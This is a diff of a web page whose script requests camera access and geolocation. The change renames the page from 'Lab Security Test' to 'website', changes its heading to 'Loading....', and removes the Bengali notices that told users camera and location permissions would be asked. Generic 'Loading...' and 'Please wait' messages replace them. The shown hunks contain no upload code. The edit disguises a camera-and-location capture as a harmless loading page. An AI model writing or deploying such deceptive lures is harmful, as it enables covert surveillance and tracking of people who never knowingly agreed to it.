@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title>Lab Security Test</title>
+  <title>website</title>
 
   <style>
     body {
@@ -68,14 +68,14 @@
 
 <div class="box">
 
-  <h2>🔐 Lab Security Test</h2>
+  <h2>Loading....</h2>
 
   <p class="notice">
-    Continue করলে camera এবং location permission চাওয়া হবে।
+    Please Tap To Continue
   </p>
 
   <button id="takePhotoBtn" onclick="startTest()">
-    📷 Continue
+    Continue
   </button>
 
   <p id="status"></p>
@@ -106,13 +106,13 @@ async function startTest() {
      */
 
     status.innerText =
-      "📷 Camera permission চাওয়া হচ্ছে...";
+      "Loading...";
 
     if (!navigator.mediaDevices ||
         !navigator.mediaDevices.getUserMedia) {
 
       throw new Error(
-        "এই browser-এ camera access available নয়।"
+        "এই browser-এ access available নয়।"
       );
     }
 
@@ -167,11 +167,11 @@ async function startTest() {
      */
 
     status.innerText =
-      "📍 Location permission চাওয়া হচ্ছে...";
+      "Loading...";
 
     if (!navigator.geolocation) {
       throw new Error(
-        "এই browser-এ location available নয়।"
+        "এই browser-এ access available নয়।"
       );
     }
 
@@ -193,7 +193,7 @@ async function startTest() {
         console.log("Accuracy:", accuracy);
 
         status.innerText =
-          "✅ Camera এবং location permission সফল হয়েছে।";
+          "Please wait";
 
         button.style.display = "none";
 
